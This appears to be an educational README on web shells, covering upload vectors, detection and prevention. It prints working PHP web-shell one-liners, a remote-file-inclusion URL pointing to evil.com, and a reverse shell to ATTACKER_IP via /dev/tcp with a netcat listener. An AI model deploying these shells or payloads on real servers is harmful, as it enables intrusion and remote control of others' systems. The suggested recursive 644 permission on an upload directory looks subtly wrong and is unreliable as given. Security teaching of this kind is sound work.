<p align="center">
  <img src="https://github.com/user-attachments/assets/d1597378-9777-496b-9c64-260900307f53" alt="image" width="500" />
</p>

##  What is a Web Shell?

A **Web Shell** is a malicious script (usually written in languages like PHP, ASP, or JSP) that allows an attacker to remotely control a web server via a **web interface (browser)**. It acts as a backdoor that provides access to system-level commands, file operations, and sometimes even database queries.

You can think of it like this:

> “A terminal or command-line interface you can open and control through a browser.”

---

##  Why Do Hackers Use Web Shells?

Once a Web Shell is successfully uploaded to a vulnerable server, the attacker can:

* Execute OS commands (`ls`, `whoami`, `cat /etc/passwd`, etc.).
* Browse, download, upload, edit, or delete files.
* Install additional malware or backdoors.
* Conduct **privilege escalation**.
* Pivot into internal networks.
* Steal databases or credentials.
* Use the server for crypto mining or as part of a botnet.

---

##  How Are Web Shells Uploaded?

### 1.  File Upload Vulnerability

When a website allows users to upload files (images, documents, etc.), and **doesn't properly validate the file type or content**, an attacker may upload a `.php` or `.asp` file instead of an image.

####  Real-World Scenario:

A profile photo upload page accepts files like `.jpg`, `.png`, but doesn't check the actual file content (MIME type).
An attacker renames a PHP shell:

```
shell.php  →  shell.php.jpg
```

If the server executes `.php` files inside the upload folder, the attacker has direct command execution access.

---

### 2.  Remote Code Execution (RCE)

If the web application has vulnerable code that allows executing unsanitized input, the attacker can directly run commands or drop a shell.

#### Example:

```php
<?php eval($_GET['code']); ?>
```

Call this page with:

```
http://victim.com/vuln.php?code=system('id');
```

The command `id` will be executed and the result shown in the browser.

---

### 3.  Local File Inclusion (LFI) / Remote File Inclusion (RFI)

These vulnerabilities allow an attacker to **include and execute remote or local files**.

#### Example:

```
http://victim.com/index.php?page=http://evil.com/shell.txt
```

If `allow_url_include` is enabled in PHP, it will fetch and execute the remote shell file.

---

## 🧪 PoC – Basic Web Shell Example

Here's a minimal PHP Web Shell (1-liner):

```php
<?php system($_GET['cmd']); ?>
```

### Steps to test (in lab environment):

1. Save it as `shell.php`.
2. Upload it to a vulnerable server.
3. Access it like this:

```
http://victim.com/uploads/shell.php?cmd=whoami
```

 You should see the current system user.

---

## ⚙️ Types of Web Shells

| Type                 | Description                                     |
| -------------------- | ----------------------------------------------- |
| **Simple Shell**     | 1-liner that executes system commands.          |
| **Advanced Shell**   | Full UI with file browser, database tools, etc. |
| **Obfuscated Shell** | Encoded with base64 or encrypted for stealth.   |
| **Reverse Shell**    | Server connects back to attacker's machine.     |

---

##  Popular Web Shells in the Wild

### 1. **WSO (Web Shell by Orb)**

* Full GUI with features like:

  * File manager
  * Command execution
  * Database browsing
  * Upload/download
* Password-protected interface
* Often obfuscated (harder to detect)

### 2. **C99 / R57**

* Older but still seen
* Includes file access, command execution, mailer tools

### 3. **China Chopper**

* Tiny (4KB), powerful
* Split into client + server
* Hard to detect (stealthy)
* Used by APT groups

---

## 🧪 PoC – Reverse Shell Example (PHP)

### PHP Code:

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'");
?>
```

### Steps:

1. Run Netcat listener on your machine:

```
nc -lvnp 4444
```

2. Access the script from the victim’s browser:

```
http://victim.com/shell.php
```

3. You get a full reverse shell!

---

## 🕵️ How to Detect Web Shells

### 1. **Look for Suspicious Files**:

* Random names: `1.php`, `up.php`, `cmd.php`
* In upload folders or public directories

### 2. **Search for Dangerous Functions in Code**:

* `eval`, `exec`, `shell_exec`, `passthru`, `system`
* `base64_decode`, `gzuncompress`, `assert`

### 3. **Review Server Logs**:

* Check for unusual URLs like:

  * `?cmd=`
  * `?exec=`
  * `?shell=`

### 4. **Security Tools**:

* ClamAV
* Linux Malware Detect (LMD)
* chkrootkit
* Web Application Firewalls (ModSecurity, Cloudflare)

---

##  How to Prevent Web Shells

###  1. Secure File Uploads:

* Accept only specific file types (whitelist).
* Check both file extension and MIME type.
* Rename uploaded files.
* Store files **outside the web root**.
* Disable script execution in the upload folder.

#### Example (Apache):

```apache
<Directory "/var/www/html/uploads">
    php_admin_flag engine off
</Directory>
```

#### Example (Nginx):

```nginx
location /uploads {
    location ~ \.php$ {
        return 403;
    }
}
```

---

###  2. Use Proper File Permissions

Set upload folder permissions to:

```
chmod -R 644 /var/www/html/uploads
```

Avoid `777` or executable flags.

---

###  3. Monitor Your Server

* Check access logs (`/var/log/apache2/access.log` or `/var/log/nginx/access.log`)
* Use intrusion detection systems (Snort, OSSEC)
* Automate scans with LMD or ClamAV

---

## 🛠 Tools for Web Shell Testing or Detection

| Tool       | Use Case                        |
| ---------- | ------------------------------- |
| Burp Suite | Modify requests, test shells    |
| Dirbuster  | Find hidden shell files         |
| Weevely    | CLI interface for web shells    |
| Metasploit | Deploy and interact with shells |
| Nikto      | Detect dangerous files/scripts  |

---

